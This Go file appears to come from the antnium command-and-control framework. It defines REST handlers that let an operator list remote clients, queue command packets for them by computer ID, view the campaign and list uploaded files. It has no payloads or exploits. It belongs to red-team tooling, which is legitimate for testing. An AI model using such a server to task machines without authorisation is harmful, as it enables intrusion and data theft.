package server

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

type FrontendRest struct {
	campaign   *campaign.Campaign
	middleware *Middleware
}

func MakeFrontendRest(campaign *campaign.Campaign, middleware *Middleware) FrontendRest {
	f := FrontendRest{
		campaign:   campaign,
		middleware: middleware,
	}
	return f
}

func (s *FrontendRest) adminListPackets(rw http.ResponseWriter, r *http.Request) {
	packetInfos := s.middleware.FrontendGetAllPacket()
	json, err := json.Marshal(packetInfos)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *FrontendRest) adminListPacketsComputerId(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	computerId := vars["computerId"]

	if computerId == "" {
		return
	}
	packetInfos := s.middleware.FrontendGetPacketById(computerId)
	json, err := json.Marshal(packetInfos)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *FrontendRest) adminListClients(rw http.ResponseWriter, r *http.Request) {
	hostList := s.middleware.FrontendGetAllClients()
	json, err := json.Marshal(hostList)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *FrontendRest) adminAddPacket(rw http.ResponseWriter, r *http.Request) {
	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("Could not read body")
		return
	}

	var packet model.Packet
	err = json.Unmarshal(reqBody, &packet)
	if err != nil {
		log.WithFields(log.Fields{
			"body":  reqBody,
			"error": err,
		}).Info("Error add packet")
		return
	}

	common.LogPacket("FrontendRest: Add Packet", packet)

	if packet.ComputerId == "" || packet.PacketId == "" || packet.PacketType == "" {
		log.Errorf("FrontendRest: Missing data in packet: %v", packet)
		return
	}

	err = s.middleware.FrontendAddNewPacket(&packet)
	if err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}
}

func (s *FrontendRest) adminGetCampaign(rw http.ResponseWriter, r *http.Request) {
	json, err := json.Marshal(s.campaign)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *FrontendRest) adminGetUploads(rw http.ResponseWriter, r *http.Request) {
	dirList, err := common.ListDirectory("./upload")
	if err != nil {
		log.Error("Could not: ", err)
		return
	}
	json, err := json.Marshal(dirList)
	if err != nil {
		log.Error("Could not JSON marshal", err)
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *FrontendRest) adminGetStatics(rw http.ResponseWriter, r *http.Request) {
	dirList, err := common.ListDirectory("./static")
	if err != nil {
		log.Error("Could not: ", err)
		return
	}
	json, err := json.Marshal(dirList)
	if err != nil {
		log.Error("Could not JSON marshal", err)
		return
	}
	fmt.Fprint(rw, string(json))
}
